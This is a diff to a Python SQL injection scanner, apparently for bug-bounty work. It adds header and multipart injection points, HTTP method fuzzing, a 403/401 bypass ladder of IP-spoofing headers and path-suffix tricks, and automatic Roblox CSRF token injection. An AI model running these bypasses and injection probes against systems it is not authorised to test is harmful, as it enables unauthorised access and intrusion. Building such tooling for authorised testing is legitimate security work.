@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # =============================================================================
-#  HUGINN :: sqli.py — v5.0
-#  SQL Injection Scanner — auth-aware, AI-triaged, BB-grade.
+#  HUGINN :: sqli.py — v6.0
+#  SQL Injection Scanner — auth-aware, complete-surface, AI-triaged.
 # -----------------------------------------------------------------------------
 #  Detection strategies (highest confidence first):
 #    1. error_signature    — DBMS error matched in response
@@ -11,19 +11,18 @@
 #    4. union_based        — UNION SELECT changes response shape
 #    5. status_escalation  — 2xx/3xx -> 5xx with SQL-ish content
 #    6. baseline_diff      — response body substantially differs
+#    7. reflection_probe   — payload reflected verbatim (weak signal)
 #
-#  What's new in v5.0:
-#    · HeaderJar integration — session cookies + auth tokens apply to
-#      every request; cURL output includes them
-#    · Boolean-blind wired up (was declared but never called)
-#    · Union-based column counting (new strategy)
-#    · Payload dedup by text hash + priority ordering
-#    · Destructive payload filter (--allow-destructive to enable)
-#    · Auth expiry detection (401 storm halts scan)
-#    · Per-IP payload budget (--max-payloads-per-ip)
-#    · Confirm-pass on medium confidence
-#    · Ctrl+C saves partial findings + _session.json
-#    · Progress with ETA
+#  What's new in v6.0:
+#    · 30+ header injection points (X-Forwarded-*, X-Original-URL,
+#      X-HTTP-Method-Override, True-Client-IP, X-Tenant-Id, X-User-Id, ...)
+#    · HTTP method variants for auth-gated endpoints (--method-fuzz)
+#    · Multipart form support (multipart/form-data)
+#    · 403/401 bypass ladder (IP-spoof headers, path overrides, referer tricks)
+#    · Roblox X-CSRF-TOKEN auto-fetch + injection
+#    · Reflection probe strategy
+#    · Header-VALUE injection (not just keys)
+#    · Smarter auth-expiry signal (ignores 403s to avoid false positives)
 # =============================================================================
 
 import re
@@ -48,7 +47,7 @@ try:
 except ImportError:
     BeautifulSoup = None
 
-# ---- HeaderJar (session/auth profiles) --------------------------------------
+# ---- HeaderJar + mask --------------------------------------------------------
 try:
     from huginn_utils import HeaderJar, mask_header_value
     _HEADER_JAR_AVAILABLE = True
@@ -56,6 +55,15 @@ except ImportError:
     _HEADER_JAR_AVAILABLE = False
     HeaderJar = None
     mask_header_value = None
+
+# ---- Roblox CSRF helper -----------------------------------------------------
+try:
+    from huginn_utils import get_roblox_csrf_token, reset_roblox_csrf
+    _ROBLOX_CSRF_AVAILABLE = True
+except ImportError:
+    _ROBLOX_CSRF_AVAILABLE = False
+    def get_roblox_csrf_token(*a, **kw): return None
+    def reset_roblox_csrf(*a, **kw): return None
 
 # ---- AI brain ----------------------------------------------------------------
 try:
@@ -70,9 +78,9 @@ except Exception:
 #  CONSTANTS
 # =============================================================================
 DESTRUCTIVE_TAGS = {"destructive", "rce", "file-write", "stacked"}
-AUTH_EXPIRY_THRESHOLD = 0.7   # 70% of last N responses 401 => expired
+AUTH_EXPIRY_THRESHOLD = 0.7
+ROBLOX_HOST_MARKERS = ("roblox.com", "rbxcdn.com", "robloxlabs.com")
 
-# Payload category priority (lower = tested first)
 PAYLOAD_PRIORITY = {
     "error_based":      1,
     "basic_detection":  2,
@@ -87,8 +95,113 @@ PAYLOAD_PRIORITY = {
     "legacy":           11,
     "nosql":            12,
     "modern_bypass":    13,
-    "ai_generated":     0,   # AI WAF bypass payloads always first
+    "ai_generated":     0,
 }
+
+# =============================================================================
+#  INJECTION SURFACE — headers
+# =============================================================================
+#  Ordered by exploit value. Higher = more likely to be trusted by backends
+#  and to reach SQL layers without sanitization.
+INJECTABLE_HEADERS = [
+    # --- Highest-value: commonly parsed for auth/ACL ---
+    "X-Forwarded-For",
+    "X-Forwarded-Host",
+    "X-Forwarded-Proto",
+    "X-Forwarded-Prefix",
+    "X-Original-URL",
+    "X-Rewrite-URL",
+    "X-HTTP-Method-Override",
+    "X-HTTP-Method",
+    "X-Method-Override",
+    "X-Real-IP",
+    "X-Client-IP",
+    "X-Remote-IP",
+    "X-Remote-Addr",
+    "X-Originating-IP",
+    "X-Cluster-Client-IP",
+    "True-Client-IP",
+    "CF-Connecting-IP",
+    "Fastly-Client-IP",
+    "Client-IP",
+    "Forwarded-For",
+    "Forwarded",
+    # --- Medium: multi-tenant / user-context ---
+    "X-User-Id",
+    "X-Account-Id",
+    "X-Tenant-Id",
+    "X-Org-Id",
+    "X-Organization-Id",
+    "X-Workspace-Id",
+    "X-Api-Version",
+    "X-Original-Host",
+    "X-Host",
+    "X-Backend-Server",
+    # --- Lower: content negotiation / encoding ---
+    "Referer",
+    "Origin",
+    "Accept",
+    "Accept-Language",
+    "Content-Type",
+    "X-Requested-With",
+    "X-Custom-IP-Authorization",
+]
+
+# =============================================================================
+#  403 / 401 BYPASS LADDER
+# =============================================================================
+#  Ordered highest-success first. Each entry is a dict of header overrides
+#  OR a special key {"__path_suffix__": "..."} that appends to the URL path.
+BYPASS_ATTEMPTS = [
+    # IP spoofing (loopback, private ranges, and IPv6 shorthand)
+    {"X-Forwarded-For": "127.0.0.1"},
+    {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"},
+    {"X-Forwarded-For": "localhost"},
+    {"X-Forwarded-For": "10.0.0.1"},
+    {"X-Forwarded-For": "192.168.1.1"},
+    {"X-Real-IP": "127.0.0.1"},
+    {"X-Originating-IP": "127.0.0.1"},
+    {"X-Remote-IP": "127.0.0.1"},
+    {"X-Remote-Addr": "127.0.0.1"},
+    {"X-Client-IP": "127.0.0.1"},
+    {"True-Client-IP": "127.0.0.1"},
+    {"X-Forwarded-Host": "localhost"},
+    {"X-Forwarded-Host": "127.0.0.1"},
+    # Path override tricks
+    {"X-Original-URL": "/"},
+    {"X-Rewrite-URL": "/"},
+    {"X-HTTP-Method-Override": "GET"},
+    {"X-HTTP-Method-Override": "POST"},
+    {"X-HTTP-Method-Override": "PUT"},
+    # Referer / Origin tricks (CSRF-protected endpoints)
+    {"Referer": "https://localhost/"},
+    {"Referer": "https://127.0.0.1/"},
+    # Combined
+    {
+        "X-Forwarded-For": "127.0.0.1",
+        "X-Original-URL": "/",
+        "X-Rewrite-URL": "/",
+    },
+]
+
+# URL path suffix tricks — appended to request URL when 403/401 hit
+BYPASS_PATH_SUFFIXES = [
+    "/",
+    "/.",
+    "//",
+    "/./",
+    "/%2e/",
+    "/%2e",
+    "/..",
+    "/../",
+    "/%20/",
+    "/%09/",
+    "/%00",
+    "?",
+    "#",
+    "/;",
+    "/..;/",
+]
 
 
 # =============================================================================
@@ -149,7 +262,8 @@ ERROR_SIGNATURES = {
         r"DB2 SQL error", r"CLI Driver.*DB2", r"com\.ibm\.db2",
     ],
     "informix": [
-        r"Informix ODBC Driver", r"com\.informix\.jdbc", r"ODBC Informix driver",
+        r"Informix ODBC Driver", r"com\.informix\.jdbc",
+        r"ODBC Informix driver",
     ],
     "ingres": [
         r"Ingres SQLSTATE", r"Ingres\W.*Driver",
@@ -175,7 +289,8 @@ GENERIC_500_HINTS = re.compile(
 )
 
 TIME_PAYLOADS = re.compile(
-    r"(sleep\s*\(|pg_sleep\s*\(|waitfor\s+delay|benchmark\s*\(|dbms_lock\.sleep\s*\()",
+    r"(sleep\s*\(|pg_sleep\s*\(|waitfor\s+delay|benchmark\s*\(|"
+    r"dbms_lock\.sleep\s*\()",
     re.I,
 )
 
@@ -189,7 +304,8 @@ WAF_BLOCK_SIGNATURES = {
     "cloudflare": [r"cloudflare", r"cf-error-details",
                    r"Attention Required.*Cloudflare", r"Ray ID",
                    r"Error 1020", r"Error 1015"],
-    "akamai":     [r"akamai", r"Reference\s*#\d+", r"Access Denied.*Akamai"],
+    "akamai":     [r"akamai", r"Reference\s*#\d+",
+                   r"Access Denied.*Akamai"],
     "incapsula":  [r"incap_ses", r"incapsula",
                    r"Request unsuccessful.*Incapsula"],
     "imperva":    [r"imperva", r"_Incapsula_Resource"],
@@ -255,15 +371,17 @@ def classify_status(resp):
                 "retry_after": retry_after, "notes": ""}
     if 300 <= status < 400:
         loc = headers.get("location", "")
-        return {"code": "REDIRECT", "interesting": True, "waf_name": waf_name,
+        return {"code": "REDIRECT", "interesting": True,
+                "waf_name": waf_name,
                 "retry_after": retry_after,
                 "notes": "Location: {}".format(loc[:120])}
     if status == 304:
         return {"code": "NOT_MODIFIED", "interesting": False,
                 "waf_name": waf_name, "retry_after": retry_after, "notes": ""}
     if status == 400:
-        return {"code": "BAD_REQUEST", "interesting": True, "waf_name": waf_name,
-                "retry_after": retry_after, "notes": "parser break"}
+        return {"code": "BAD_REQUEST", "interesting": True,
+                "waf_name": waf_name, "retry_after": retry_after,
+                "notes": "parser break"}
     if status == 401:
         return {"code": "AUTH_REQUIRED", "interesting": True,
                 "waf_name": waf_name, "retry_after": retry_after, "notes": ""}
@@ -346,8 +464,12 @@ def _is_static_url(url):
     return False
 
 
+def _is_roblox_host(url_or_host):
+    h = (url_or_host or "").lower()
+    return any(m in h for m in ROBLOX_HOST_MARKERS)
+
+
 def _fingerprint_response(resp):
-    """Stable fingerprint of a response for differential comparison."""
     if resp is None:
         return {"hash": None, "length": 0, "status": None, "ctype": None}
 
@@ -356,11 +478,9 @@ def _fingerprint_response(resp):
     except Exception:
         body = ""
 
-    # Strip volatile tokens
     stable = re.sub(r"\b[a-f0-9]{24,}\b", "__HEX__", body)
     stable = re.sub(r"\b[A-Za-z0-9+/=]{40,}\b", "__B64__", stable)
 
-    # Mix in structural headers so same-body-different-ctype is detected
     try:
         ctype = (resp.headers.get("Content-Type") or "").split(";")[0].strip()
     except Exception:
@@ -396,23 +516,16 @@ def _fingerprints_differ(a, b, min_len_delta=200):
 
 
 def _boolean_opposite(payload):
-    """
-    Generate the FALSE counterpart of a boolean-blind payload.
-    Returns None if we can't reliably pair it.
-    """
     if not payload:
         return None
-    # Simple 1=1 / 1=2 swap
     if "1=1" in payload:
         return payload.replace("1=1", "1=2")
     if "1=2" in payload:
         return payload.replace("1=2", "1=1")
-    # String comparisons
     if "'a'='a'" in payload:
         return payload.replace("'a'='a'", "'a'='b'")
     if "'a'='b'" in payload:
         return payload.replace("'a'='b'", "'a'='a'")
-    # ASCII comparison: toggle the numeric value
     m = re.search(r"=\s*(\d{1,4})\b", payload)
     if m and ("ASCII" in payload.upper() or "SUBSTRING" in payload.upper()):
         val = int(m.group(1))
@@ -425,6 +538,19 @@ def _payload_text_hash(payload_text):
                                                      errors="ignore")).hexdigest()[:12]
 
 
+def _payload_reflected(resp, payload):
+    """True if the payload appears verbatim in the response body."""
+    if resp is None or not payload:
+        return False
+    try:
+        body = resp.text or ""
+    except Exception:
+        return False
+    if len(payload) < 4:
+        return False
+    return payload in body
+
+
 # =============================================================================
 #  INJECTION POINT MODEL
 # =============================================================================
@@ -433,11 +559,13 @@ class InjectionPoint:
                  "json_path", "extra_headers", "form_data", "json_body",
                  "content_type", "baseline_resp", "baseline_fp",
                  "timing_baseline", "timing_stddev", "stable",
-                 "payloads_tested", "found_high_confidence")
+                 "payloads_tested", "found_high_confidence",
+                 "is_header_value", "needs_csrf")
 
     def __init__(self, url, method, location, name, value,
                  json_path=None, extra_headers=None,
-                 form_data=None, json_body=None, content_type=None):
+                 form_data=None, json_body=None, content_type=None,
+                 is_header_value=False, needs_csrf=False):
         self.url = url
         self.method = method
         self.location = location
@@ -455,6 +583,8 @@ class InjectionPoint:
         self.stable = True
         self.payloads_tested = 0
         self.found_high_confidence = False
+        self.is_header_value = is_header_value
+        self.needs_csrf = needs_csrf
 
     def key(self):
         return (self.url, self.method, self.location, self.name)
@@ -473,7 +603,8 @@ def _extract_query_params(page):
     if not parsed.query:
         return []
     qs = parse_qs(parsed.query, keep_blank_values=True)
-    return [InjectionPoint(url, "GET", "query", k, v[0]) for k, v in qs.items()]
+    return [InjectionPoint(url, "GET", "query", k, v[0])
+            for k, v in qs.items()]
 
 
 def _extract_path_segments(page):
@@ -527,13 +658,38 @@ def _extract_forms(page):
 
 
 def _extract_headers(page):
-    headers = [
-        "Referer", "X-Forwarded-For", "X-Forwarded-Host",
-        "X-Real-IP", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
-        "X-Client-IP", "Forwarded", "Origin", "X-Original-URL",
+    """
+    Two kinds of header injection points:
+      A) header NAME is the payload target (rare, most servers ignore unknown)
+      B) header VALUE is replaced with the payload (common — log parsers,
+         WAF rule engines, and multi-tenant backends all read header values)
+    Both are extracted.
+    """
+    points = []
+
+    # (A) Test each header NAME as an injected header with an empty value
+    for h in INJECTABLE_HEADERS:
+        points.append(InjectionPoint(
+            page["url"], "GET", "header", h, "",
+            is_header_value=False,
+        ))
+
+    # (B) Test the VALUE of headers the target already sent/received.
+    #     We use the URL's own request headers if available, else fall
+    #     back to well-known header names with a placeholder.
+    req_headers = page.get("headers") or {}
+    interesting_value_headers = [
+        "Referer", "Origin", "User-Agent", "Accept",
+        "Accept-Language", "X-Requested-With",
     ]
-    return [InjectionPoint(page["url"], "GET", "header", h, "")
-            for h in headers]
+    for h in interesting_value_headers:
+        existing = req_headers.get(h, "")
+        points.append(InjectionPoint(
+            page["url"], "GET", "header_value", h, existing,
+            is_header_value=True,
+        ))
+
+    return points
 
 
 def _extract_cookies(page):
@@ -581,12 +737,95 @@ def _extract_json_body(page):
     return points
 
 
-def extract_injection_points(pages):
+def _extract_multipart(page):
+    """
+    Parse `multipart/form-data` bodies into injectable fields.
+    BeautifulSoup can't do this directly, so we extract what we can
+    from the raw body and the Content-Type boundary.
+    """
+    ct = (page.get("content_type") or "").lower()
+    content = page.get("content") or ""
+    if "multipart/form-data" not in ct or not content:
+        return []
+
+    # Extract boundary
+    m = re.search(r'boundary=([^;]+)', ct)
+    if not m:
+        return []
+    boundary = m.group(1).strip().strip('"')
+    if not boundary:
+        return []
+
+    parts = content.split("--" + boundary)
+    fields = []
+    for part in parts:
+        if not part.strip() or part.strip() == "--":
+            continue
+        # Split headers from body
+        if "\r\n\r\n" in part:
+            headers_part, _, body_part = part.partition("\r\n\r\n")
+        elif "\n\n" in part:
+            headers_part, _, body_part = part.partition("\n\n")
+        else:
+            continue
+
+        nm = re.search(r'name="([^"]+)"', headers_part)
+        if not nm:
+            continue
+        field_name = nm.group(1)
+        value = body_part.strip().rstrip("--").strip()
+
+        # Skip file fields (huge binary content)
+        if "filename=" in headers_part:
+            continue
+
+        fields.append((field_name, value))
+
+    if not fields:
+        return []
+
+    form_data = dict(fields)
+    points = []
+    for name, value in fields:
+        points.append(InjectionPoint(
+            page["url"], "POST", "body_multipart", name, value,
+            form_data=dict(form_data),
+            content_type=page.get("content_type") or
+                          "multipart/form-data",
+        ))
+    return points
+
+
+def _extract_method_variants(page, enable=True):
+    """
+    For GET endpoints, generate POST/PUT/PATCH/DELETE/HEAD/OPTIONS
+    variants with the same query-string param names — many apps accept
+    both and only sanitise one path.
+    """
+    if not enable:
+        return []
+    url = page["url"]
+    parsed = urlparse(url)
+    if not parsed.query:
+        return []
+    qs = parse_qs(parsed.query, keep_blank_values=True)
+    points = []
+    for method in ("POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"):
+        for k, v in qs.items():
+            points.append(InjectionPoint(
+                url, method, "query", k, v[0],
+                extra_headers={"_method_variant": method},
+            ))
+    return points
+
+
+def extract_injection_points(pages, method_fuzz=False):
     points, seen = [], set()
     for page in pages:
         url = page.get("url", "")
         if _is_static_url(url):
             continue
+
         cands = []
         cands.extend(_extract_query_params(page))
         cands.extend(_extract_path_segments(page))
@@ -594,6 +833,9 @@ def extract_injection_points(pages):
         cands.extend(_extract_headers(page))
         cands.extend(_extract_cookies(page))
         cands.extend(_extract_json_body(page))
+        cands.extend(_extract_multipart(page))
+        cands.extend(_extract_method_variants(page, enable=method_fuzz))
+
         for ip in cands:
             k = ip.key()
             if k in seen:
@@ -604,7 +846,7 @@ def extract_injection_points(pages):
 
 
 # =============================================================================
-#  REQUEST BUILDER (payload-aware)
+#  REQUEST BUILDER
 # =============================================================================
 def _set_json_path(obj, path, value):
     tokens = re.findall(r"\.([^\.\[\]]+)|\[(\d+)\]", path)
@@ -617,17 +859,33 @@ def _set_json_path(obj, path, value):
         cur = cur[key]
 
 
+def _multipart_encode(fields, boundary):
+    """Encode a dict of fields as multipart/form-data body bytes."""
+    out = []
+    for name, value in fields.items():
+        out.append("--" + boundary)
+        out.append('Content-Disposition: form-data; name="{}"'.format(name))
+        out.append("")
+        out.append(str(value))
+    out.append("--" + boundary + "--")
+    out.append("")
+    return "\r\n".join(out).encode("utf-8")
+
+
 def build_request(ip, payload, timeout=12, extra_headers=None,
-                  allow_redirects=False):
+                  allow_redirects=False, override_method=None,
+                  url_suffix=None):
     """
-    Construct and send a request with the payload injected into `ip`.
-    Does NOT merge session headers — that's done by the caller.
+    Construct and send a request with `payload` injected into `ip`.
+    extra_headers should already contain session headers (HeaderJar).
+    Returns the response or None.
     """
     headers = dict(ip.extra_headers)
     if extra_headers:
         headers.update(extra_headers)
+
     url = ip.url
-    method = ip.method
+    method = override_method or ip.method
     data = None
 
     if ip.location == "query":
@@ -635,6 +893,7 @@ def build_request(ip, payload, timeout=12, extra_headers=None,
         qs = parse_qs(p.query, keep_blank_values=True)
         qs[ip.name] = [payload]
         url = urlunparse(p._replace(query=urlencode(qs, doseq=True)))
+
     elif ip.location == "path":
         idx = int(headers.pop("_segment_index", "0"))
         p = urlparse(url)
@@ -642,25 +901,55 @@ def build_request(ip, payload, timeout=12, extra_headers=None,
         if idx < len(segs):
             segs[idx] = payload
         url = urlunparse(p._replace(path="/" + "/".join(segs)))
+
     elif ip.location == "body_form":
         body = dict(ip.form_data)
         body[ip.name] = payload
         data = body
         headers["Content-Type"] = (ip.content_type or
                                     "application/x-www-form-urlencoded")
+        if method == "GET":
+            method = "POST"
+
+    elif ip.location == "body_multipart":
+        body = dict(ip.form_data)
+        body[ip.name] = payload
+        boundary = "----HUGINN{}".format(_payload_text_hash(payload))
+        try:
+            data = _multipart_encode(body, boundary)
+            headers["Content-Type"] = "multipart/form-data; boundary={}".format(
+                boundary)
+        except Exception:
+            return None
+        if method == "GET":
+            method = "POST"
+
     elif ip.location == "body_json":
         body = json.loads(json.dumps(ip.json_body))
         _set_json_path(body, ip.json_path, payload)
         data = json.dumps(body)
         headers["Content-Type"] = "application/json"
+        if method == "GET":
+            method = "POST"
+
     elif ip.location == "cookie":
-        # Merge with any existing session Cookie rather than clobbering
         existing = headers.get("Cookie", "")
         pair = "{}={}".format(ip.name, payload)
         headers["Cookie"] = ("{}; {}".format(existing, pair).strip("; ")
                              if existing else pair)
+
     elif ip.location == "header":
         headers[ip.name] = payload
+
+    elif ip.location == "header_value":
+        headers[ip.name] = payload
+
+    # Apply URL suffix if requested (used by 403 bypass ladder)
+    if url_suffix:
+        url = url.rstrip("/") + url_suffix
+
+    # Strip internal tracker keys before sending
+    headers.pop("_method_variant", None)
 
     return send_request(
         url, method=method, headers=headers,
@@ -668,21 +957,20 @@ def build_request(ip, payload, timeout=12, extra_headers=None,
     )
 
 
-def build_curl(ip, payload, timeout=15, session_headers=None):
-    """
-    Build a reproducible curl command. If `session_headers` is provided,
-    cookie/auth headers are included (values shown — this is a repro
-    helper, not a log).
-    """
+def build_curl(ip, payload, timeout=15, session_headers=None,
+               override_method=None):
     parts = ["curl", "-sk", "--max-time", str(timeout), "-i"]
 
-    # Inject auth/session headers first
     if session_headers:
         for k, v in session_headers.items():
             low = k.lower()
             if low in ("cookie", "authorization", "x-api-key",
-                       "x-auth-token"):
+                       "x-auth-token", "x-csrf-token"):
                 parts.extend(["-H", shlex.quote("{}: {}".format(k, v))])
+
+    method = override_method or ip.method
+    if method != "GET":
+        parts.extend(["-X", method])
 
     if ip.location == "query":
         p = urlparse(ip.url)
@@ -690,6 +978,7 @@ def build_curl(ip, payload, timeout=15, session_headers=None):
         qs[ip.name] = [payload]
         url = urlunparse(p._replace(query=urlencode(qs, doseq=True)))
         parts.append(shlex.quote(url))
+
     elif ip.location == "path":
         idx = int((ip.extra_headers or {}).get("_segment_index", "0"))
         p = urlparse(ip.url)
@@ -698,33 +987,38 @@ def build_curl(ip, payload, timeout=15, session_headers=None):
             segs[idx] = payload
         url = urlunparse(p._replace(path="/" + "/".join(segs)))
         parts.append(shlex.quote(url))
-    elif ip.location == "body_form":
+
+    elif ip.location in ("body_form", "body_multipart"):
         body = dict(ip.form_data)
         body[ip.name] = payload
-        if ip.method == "GET":
-            p = urlparse(ip.url)
-            url = urlunparse(p._replace(query=urlencode(body, doseq=True)))
-            parts.append(shlex.quote(url))
+        if ip.location == "body_multipart":
+            boundary = "----HUGINN{}".format(_payload_text_hash(payload))
+            parts.extend(["-H", shlex.quote(
+                "Content-Type: multipart/form-data; boundary=" + boundary)])
+            for k, v in body.items():
+                parts.extend(["-F", shlex.quote("{}={}".format(k, v))])
         else:
-            parts.extend(["-X", "POST"])
             for k, v in body.items():
                 parts.extend(["--data-urlencode",
                               shlex.quote("{}={}".format(k, v))])
-            parts.append(shlex.quote(ip.url))
+        parts.append(shlex.quote(ip.url))
+
     elif ip.location == "body_json":
         body = json.loads(json.dumps(ip.json_body))
         _set_json_path(body, ip.json_path, payload)
-        parts.extend(["-X", "POST"])
         parts.extend(["-H", shlex.quote("Content-Type: application/json")])
         parts.extend(["--data-raw", shlex.quote(json.dumps(body))])
         parts.append(shlex.quote(ip.url))
+
     elif ip.location == "cookie":
         parts.extend(["-H",
                       shlex.quote("Cookie: {}={}".format(ip.name, payload))])
         parts.append(shlex.quote(ip.url))
-    elif ip.location == "header":
+
+    elif ip.location in ("header", "header_value"):
         parts.extend(["-H", shlex.quote("{}: {}".format(ip.name, payload))])
         parts.append(shlex.quote(ip.url))
+
     else:
         parts.append(shlex.quote(ip.url))
 
@@ -780,7 +1074,10 @@ class SQLiScanner:
                  no_auth=False,
                  max_payloads_per_ip=200,
                  allow_destructive=False,
-                 confirm_medium=True):
+                 confirm_medium=True,
+                 method_fuzz=False,
+                 bypass_403=True,
+                 roblox_csrf=True):
         self.program_dir = Path(program_dir)
         self.sites_root = Path(sites_root or (self.program_dir / "sites"))
         self.findings_root = self.program_dir / "findings" / "sqli"
@@ -799,12 +1096,16 @@ class SQLiScanner:
         self.max_payloads_per_ip = int(max_payloads_per_ip or 0)
         self.allow_destructive = allow_destructive
         self.confirm_medium = confirm_medium
+        self.method_fuzz = method_fuzz
+        self.bypass_403_enabled = bypass_403
+        self.roblox_csrf_enabled = roblox_csrf
 
-        # --- HeaderJar (session cookies / auth tokens) ---
+        # --- HeaderJar ---
         self.header_jar = None
         self.no_auth = no_auth
         if not no_auth and _HEADER_JAR_AVAILABLE:
-            hdir = Path(headers_dir) if headers_dir else (self.program_dir / "headers")
+            hdir = (Path(headers_dir) if headers_dir
+                    else (self.program_dir / "headers"))
             try:
                 self.header_jar = HeaderJar(hdir, cli_headers=cli_headers or {})
                 self.header_jar.load()
@@ -812,37 +1113,37 @@ class SQLiScanner:
                 log("HeaderJar init failed: {}".format(e), "warn", "SQLI")
                 self.header_jar = None
 
-        # Legacy CLI cookie/UA — merge into HeaderJar overrides if present
         self.static_headers = {}
         if cookie:
             self.static_headers["Cookie"] = cookie
         if user_agent:
             self.static_headers["User-Agent"] = user_agent
 
+        # --- Roblox CSRF cache (per host) ---
+        self._roblox_csrf_cache = {}
+        self._roblox_csrf_lock = threading.Lock()
+
         self.seen_signatures = set()
         self._seen_lock = threading.Lock()
-        self.seen_payload_hashes = set()   # dedup by payload text
-        self._payload_hash_lock = threading.Lock()
         self._payload_cache = None
 
-        # Per-host throttle + backoff
         self._throttle_last = {}
         self._throttle_lock = threading.Lock()
         self._host_backoff = {}
 
-        # WAF / rate-limit tracking
         self.host_waf = {}
         self.host_waf_counts = {}
         self.host_rl_counts = {}
+        self.host_403_counts = {}
+        self.host_bypass_success = {}   # host -> list of {headers, url}
         self._waf_lock = threading.Lock()
 
-        # Auth expiry tracking (rolling window of 401s per host)
+        # Auth-expiry (only 401s, not 403s)
         self._auth_window = {}
         self._auth_window_size = 20
         self.host_auth_expired = {}
         self._auth_lock = threading.Lock()
 
-        # AI bookkeeping
         self.ai_dropped = []
         self._ai_dropped_lock = threading.Lock()
         self.brain = None
@@ -854,27 +1155,66 @@ class SQLiScanner:
                 self.brain = None
 
     # ------------------------------------------------------------------ #
-    #  Auth header resolution
+    #  Roblox CSRF
     # ------------------------------------------------------------------ #
-    def _headers_for(self, url):
-        """
-        Return the merged session headers for this URL.
-        Precedence: HeaderJar (default+host) < static_headers (legacy CLI).
-        """
+    def _roblox_csrf_for(self, host):
+        if not (self.roblox_csrf_enabled and _ROBLOX_CSRF_AVAILABLE):
+            return None
+        if not _is_roblox_host(host):
+            return None
+        with self._roblox_csrf_lock:
+            cached = self._roblox_csrf_cache.get(host)
+            if cached:
+                return cached
+
+        # Fetch using current session headers
+        session = self._session_headers_base(host)
+        try:
+            token = get_roblox_csrf_token(session_headers=session,
+                                           host=host.split(":")[0])
+        except Exception:
+            token = None
+        if token:
+            with self._roblox_csrf_lock:
+                self._roblox_csrf_cache[host] = token
+        return token
+
+    def _session_headers_base(self, host):
+        """Just the raw profile-based headers (no per-request extras)."""
         if self.header_jar is not None:
-            merged = self.header_jar.headers_for(url)
-            # static_headers win (CLI override)
-            merged.update(self.static_headers)
-            return merged
+            return self.header_jar.headers_for(host)
         return dict(self.static_headers)
 
     # ------------------------------------------------------------------ #
-    #  Per-host throttle + auth window + backoff
+    #  Auth header resolution
+    # ------------------------------------------------------------------ #
+    def _headers_for(self, url, method="GET"):
+        """
+        Merge session headers from HeaderJar + static_headers.
+        Auto-inject Roblox X-CSRF-TOKEN for non-GET requests.
+        """
+        host = urlparse(url).netloc.lower()
+
+        if self.header_jar is not None:
+            merged = self.header_jar.headers_for(url)
+            merged.update(self.static_headers)
+        else:
+            merged = dict(self.static_headers)
+
+        # Roblox CSRF for state-changing methods
+        if method not in ("GET", "HEAD", "OPTIONS"):
+            token = self._roblox_csrf_for(host)
+            if token and "x-csrf-token" not in {k.lower() for k in merged}:
+                merged["X-CSRF-TOKEN"] = token
+
+        return merged
+
+    # ------------------------------------------------------------------ #
+    #  Throttle + backoff + auth window
     # ------------------------------------------------------------------ #
     def _throttle(self, url):
         host = urlparse(url).netloc.lower()
 
-        # Auth expired? Skip immediately
         with self._auth_lock:
             if self.host_auth_expired.get(host):
                 return False
@@ -911,11 +1251,6 @@ class SQLiScanner:
                 self.host_waf[host] = waf_name
 
     def _note_response_status(self, host, status_code):
-        """
-        Feed every response into the auth-expiry window.
-        If >AUTH_EXPIRY_THRESHOLD of the last N responses were 401,
-        mark the host as auth-expired.
-        """
         with self._auth_lock:
             window = self._auth_window.setdefault(host, [])
             window.append(1 if status_code == 401 else 0)
@@ -925,13 +1260,73 @@ class SQLiScanner:
                     sum(window) / float(len(window)) >= AUTH_EXPIRY_THRESHOLD):
                 if not self.host_auth_expired.get(host):
                     self.host_auth_expired[host] = True
-                    log("AUTH EXPIRED on {} — {} of last {} responses were 401. "
-                        "Session likely dead. Halting host.".format(
-                            host, sum(window), len(window)),
+                    log("AUTH EXPIRED on {} — {} of last {} responses were 401.".format(
+                        host, sum(window), len(window)),
                         "err", "SQLI")
 
+    def _note_403(self, host):
+        with self._waf_lock:
+            self.host_403_counts[host] = self.host_403_counts.get(host, 0) + 1
+
+    def _note_bypass_success(self, host, headers_used, url_used):
+        with self._waf_lock:
+            lst = self.host_bypass_success.setdefault(host, [])
+            if len(lst) < 10:
+                lst.append({"headers": headers_used, "url": url_used})
+
     # ------------------------------------------------------------------ #
-    #  Payload loading & ordering
+    #  403 / 401 bypass ladder
+    # ------------------------------------------------------------------ #
+    def _try_bypass_ladder(self, ip, base_session_headers):
+        """
+        When baseline returns 403/401, try a ladder of bypass tricks.
+        Returns the first (response, headers, url) that yields non-403/401,
+        or None if nothing worked.
+        """
+        if not self.bypass_403_enabled:
+            return None
+
+        for attempt in BYPASS_ATTEMPTS:
+            merged = dict(base_session_headers)
+            merged.update(attempt)
+            try:
+                r = build_request(ip, ip.value, timeout=self.timeout,
+                                  extra_headers=merged)
+            except Exception:
+                continue
+            if r is None:
+                continue
+            if r.status_code not in (401, 403):
+                host = urlparse(ip.url).netloc.lower()
+                self._note_bypass_success(host, attempt, ip.url)
+                log("403/401 bypass worked: {} @ {} headers={}".format(
+                    r.status_code, ip.url, list(attempt.keys())),
+                    "info", "SQLI")
+                return r, merged
+
+        # Try path-suffix tricks on the URL
+        for suffix in BYPASS_PATH_SUFFIXES:
+            try:
+                r = build_request(ip, ip.value, timeout=self.timeout,
+                                  extra_headers=base_session_headers,
+                                  url_suffix=suffix)
+            except Exception:
+                continue
+            if r is None:
+                continue
+            if r.status_code not in (401, 403):
+                host = urlparse(ip.url).netloc.lower()
+                self._note_bypass_success(host,
+                                           {"__path_suffix__": suffix},
+                                           ip.url + suffix)
+                log("403/401 bypass via path suffix: {} @ {}{}".format(
+                    r.status_code, ip.url, suffix), "info", "SQLI")
+                return r, base_session_headers
+
+        return None
+
+    # ------------------------------------------------------------------ #
+    #  Payload loading
     # ------------------------------------------------------------------ #
     def load_and_filter_payloads(self):
         data = load_payloads("sqli")
@@ -949,25 +1344,21 @@ class SQLiScanner:
                     "payload": entry, "tags": [], "description": "",
                 }
 
-            # Destructive filter
             tags = set(entry.get("tags") or [])
             if not self.allow_destructive and (tags & DESTRUCTIVE_TAGS):
                 skipped_destructive += 1
                 continue
 
-            # WAF hint filter
             entry_waf = entry.get("waf")
             if self.waf_hint and entry_waf:
                 if self.waf_hint.lower() not in entry_waf.lower():
                     continue
 
-            # DBMS hint filter
             entry_dbms = (entry.get("dbms") or "all").lower()
             if self.dbms_hint and entry_dbms not in ("all", "generic"):
                 if self.dbms_hint.lower() not in entry_dbms:
                     continue
 
-            # Dedup by payload text
             pt = entry.get("payload") or ""
             h = _payload_text_hash(pt)
             if h in seen_hashes:
